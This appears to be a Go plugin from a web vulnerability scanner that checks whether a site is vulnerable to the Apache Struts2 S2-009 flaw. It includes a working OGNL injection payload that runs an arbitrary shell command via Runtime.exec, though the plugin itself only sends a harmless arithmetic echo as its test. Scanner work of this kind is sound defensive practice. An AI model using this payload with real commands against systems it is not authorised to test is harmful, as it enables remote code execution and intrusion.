/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

var ExecPayload009 = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[({key})(%27meh%27)]"

func isJavaStrutsApp(flow *http.Flow) bool {
	if flow.Response == nil {
		return false
	}
	// Check Set-Cookie for JSESSIONID
	for _, cookie := range flow.Response.Cookies() {
		if cookie.Name == "JSESSIONID" {
			return true
		}
	}
	// Check X-Powered-By header
	xPoweredBy := flow.Response.GetHeader("X-Powered-By")
	if strings.Contains(strings.ToLower(xPoweredBy), "java") ||
		strings.Contains(strings.ToLower(xPoweredBy), "servlet") ||
		strings.Contains(strings.ToLower(xPoweredBy), "jsp") ||
		strings.Contains(strings.ToLower(xPoweredBy), "struts") {
		return true
	}
	// Check Server header
	server := flow.Response.GetHeader("Server")
	if strings.Contains(strings.ToLower(server), "tomcat") ||
		strings.Contains(strings.ToLower(server), "jetty") ||
		strings.Contains(strings.ToLower(server), "jboss") ||
		strings.Contains(strings.ToLower(server), "weblogic") ||
		strings.Contains(strings.ToLower(server), "websphere") {
		return true
	}
	// Check URL for Struts2 common extensions
	urlStr := flow.Request.URL().String()
	if strings.Contains(urlStr, ".action") || strings.Contains(urlStr, ".do") {
		return true
	}
	// Check response body for Struts2 error messages
	body := flow.Response.Text
	if strings.Contains(body, "struts problem report") ||
		strings.Contains(body, "there is no action mapped for namespace") ||
		strings.Contains(body, "no result defined for action and result input") {
		return true
	}
	return false
}

type S009 struct {
}

func (*S009) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection S2-009, %s", flow.Request.URL())
			if !isJavaStrutsApp(flow) {
				logger.Debugf("Skip S2-009 detection, target does not appear to be a Java/Struts application: %s", flow.Request.URL())
				return nil
			}
			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			payload := ExecPayload009
			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}
			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{ID: "struts/s2-009/default", Plugin: "struts/s2-009", Category: "struts/s2-009", Severity: model.SeverityCritical},
	}
}
